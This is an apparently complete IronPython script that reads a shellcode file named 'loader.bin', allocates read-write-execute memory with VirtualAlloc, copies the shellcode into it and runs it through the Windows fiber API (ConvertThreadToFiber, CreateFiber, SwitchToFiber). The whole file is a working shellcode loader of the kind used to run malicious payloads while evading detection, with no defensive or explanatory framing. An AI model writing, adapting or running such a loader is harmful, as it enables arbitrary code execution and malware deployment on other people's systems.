import clr
clr.AddReference("System")
import System
import System.Diagnostics
import System.Runtime.InteropServices

clr.AddReference("Fiber")
import Fiber

shellcode = open('loader.bin','rb').read()
print(len(shellcode))

mainFiber = Fiber.API.ConvertThreadToFiber(System.IntPtr.Zero)

i = System.Int32(len(shellcode))
my_buf_len = System.IntPtr.op_Explicit(i)
shellMemory = Fiber.API.VirtualAlloc(System.IntPtr.Zero,my_buf_len,0x3000,0x40)
Fiber.API.MoveMemory(shellMemory,shellcode,len(shellcode))
shellFiber = Fiber.API.CreateFiber(0,shellMemory,System.IntPtr.Zero)
Fiber.API.SwitchToFiber(shellFiber)